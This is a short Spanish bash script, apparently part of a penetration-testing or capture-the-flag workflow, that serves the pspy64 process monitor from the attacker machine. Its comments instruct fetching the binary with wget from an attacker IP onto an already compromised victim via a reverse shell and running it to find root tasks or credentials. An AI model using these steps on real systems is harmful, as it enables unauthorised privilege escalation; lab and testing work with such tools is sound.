#!/usr/bin/env bash
#
# 04_privesc_pspy.sh
# Automatiza la parte de atacante para servir pspy64 al host
# comprometido y monitorizar procesos en busca de credenciales o
# tareas ejecutadas como root.
#
# Uso (en la máquina atacante):
#   ./04_privesc_pspy.sh [puerto_http]
#
# Ejemplo:
#   ./04_privesc_pspy.sh 8888
#
# En la máquina víctima (tras obtener la reverse shell):
#   wget http://<IP_atacante>:<puerto>/pspy64 -O pspy64
#   chmod +x pspy64
#   ./pspy64
#
set -euo pipefail

PORT="${1:-8888}"
BIN_DIR="${2:-/usr/local/bin}"

if [[ ! -f "${BIN_DIR}/pspy64" ]]; then
  echo "[!] No se encontró ${BIN_DIR}/pspy64."
  echo "    Descárgalo desde: https://github.com/DominicBreuker/pspy/releases"
  exit 1
fi

cd "${BIN_DIR}"
echo "[*] Sirviendo pspy64 en el puerto ${PORT}..."
python3 -m http.server "${PORT}"
